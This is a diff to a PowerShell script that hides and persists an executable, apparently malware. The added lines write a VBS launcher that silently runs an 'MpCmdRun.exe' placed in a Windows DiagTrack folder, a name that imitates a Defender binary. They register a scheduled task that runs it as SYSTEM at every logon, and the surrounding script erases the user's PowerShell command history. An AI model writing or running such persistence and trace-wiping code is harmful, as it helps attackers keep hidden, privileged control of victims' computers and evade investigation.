@@ -94,9 +94,21 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
 }
 
+$vbspath = "$env:ProgramData\MpCmdRunHidden.vbs"
+Set-Content $vbspath 'CreateObject("Wscript.Shell").Run "C:\Windows\DiagTrack\Settings\MpCmdRun.exe", 0, False'
+
+schtasks /create /tn "MpCmdRunTask" /tr "wscript.exe \"$vbspath\"" /sc onlogon /ru "SYSTEM"
+
+
+
 # Register the scheduled task
-schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
+#schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
+
+
+
 
 # Clear PowerShell history
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
 Remove-Item -Path $historyPath
+
+
